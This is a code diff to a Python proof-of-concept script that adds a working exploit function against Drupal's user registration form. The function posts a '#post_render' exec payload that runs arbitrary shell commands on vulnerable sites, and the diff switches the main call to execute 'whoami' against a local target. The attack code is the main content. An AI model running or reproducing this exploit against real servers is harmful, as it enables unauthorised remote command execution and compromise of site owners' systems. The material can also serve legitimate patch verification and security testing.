@@ -29,11 +29,22 @@ def poc(target):
         if check.status_code == 200 and ";-)" in check.text:
             result['target']=target
             result['poc']=NAME
+            result['testurl']=target+'/hello.txt'
             return result
     except:
         pass
 
+def exp(target,cmd):
+    url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
+    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
+               'mail[#type]': 'markup', 'mail[#markup]': cmd}
+    headers = {"User-Agent":ua,
+               "Content-Type": "application/hal+json"}
+    try:
+        requests.post(url, headers=headers,data=payload, verify=False)
+    except:
+        pass
 
 
 if __name__ == '__main__':
-    poc('http://127.0.0.1')
+    exp('http://127.0.0.1/','whoami | tee 1.txt')
